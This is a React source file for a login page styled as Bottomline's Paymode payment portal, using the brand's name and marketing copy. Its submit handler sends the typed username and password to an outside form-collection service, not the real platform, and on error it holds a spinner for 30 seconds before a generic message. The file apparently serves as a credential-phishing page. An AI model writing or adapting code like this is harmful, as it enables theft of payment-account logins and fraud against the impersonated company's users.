import React, { useState } from "react";
import axios from "axios";
import { ClipLoader } from "react-spinners";

const FORMSPARK_FORM_ID = "https://submit-form.com/YOUR_FORM_ID";

const LoginPage = () => {
  const [formData, setFormData] = useState({ username: "", password: "" });
  const [isLoading, setIsLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true);
    setErrorMessage("");

    try {
      const response = await axios.post(FORMSPARK_FORM_ID, formData);
      if (response.status === 200) {
        setIsLoading(false);
        // Redirect or show success message
      }
    } catch (error) {
      setTimeout(() => {
        setIsLoading(false);
        setErrorMessage("Error, please try again.");
      }, 30000); // Simulate spinner for 30 seconds before showing error
    }
  };

  return (
    <div className="flex flex-col md:flex-row h-screen">
      {/* Left Side: Login Form */}
      <div className="w-full md:w-1/2 flex items-center justify-center bg-gray-50 p-6">
        <form
          onSubmit={handleSubmit}
          className="w-full max-w-sm bg-white p-6 shadow-md rounded-lg"
        >
          <h2 className="text-lg font-semibold text-gray-700 mb-4">Bottomline | PAYMODE</h2>
          {errorMessage && (
            <div className="bg-red-100 text-red-500 p-2 rounded-md mb-4 text-sm">
              {errorMessage}
            </div>
          )}
          {isLoading && (
            <div className="flex justify-center mb-4">
              <ClipLoader color="#D1392B" size={30} />
            </div>
          )}
          <div className="mb-4">
            <input
              type="text"
              name="username"
              value={formData.username}
              onChange={handleInputChange}
              placeholder="Username"
              className="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
              required
            />
          </div>
          <div className="mb-4">
            <input
              type="password"
              name="password"
              value={formData.password}
              onChange={handleInputChange}
              placeholder="Password"
              className="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
              required
            />
          </div>
          <button
            type="submit"
            disabled={isLoading}
            className={`w-full py-3 text-white rounded-md ${
              isLoading ? "bg-gray-400" : "bg-blue-500 hover:bg-blue-600"
            } transition-colors`}
          >
            Log In
          </button>
          <div className="text-sm text-center mt-4">
            <a
              href="/forgot-password"
              className="text-blue-500 hover:underline"
            >
              Forgot password?
            </a>
            <span className="mx-2">|</span>
            <a
              href="/forgot-username"
              className="text-blue-500 hover:underline"
            >
              Forgot username?
            </a>
          </div>
        </form>
      </div>

      {/* Right Side: Marketing Content */}
      <div className="w-full md:w-1/2 bg-green-100 flex items-center justify-center p-6">
        <div className="max-w-md text-center">
          <h2 className="text-2xl font-bold text-gray-700 mb-4">
            Paymode is a better way to pay and get paid
          </h2>
          <p className="text-gray-600">
            Hundreds of thousands of network members have found the way.
          </p>
        </div>
      </div>
    </div>
  );
};

export default LoginPage;
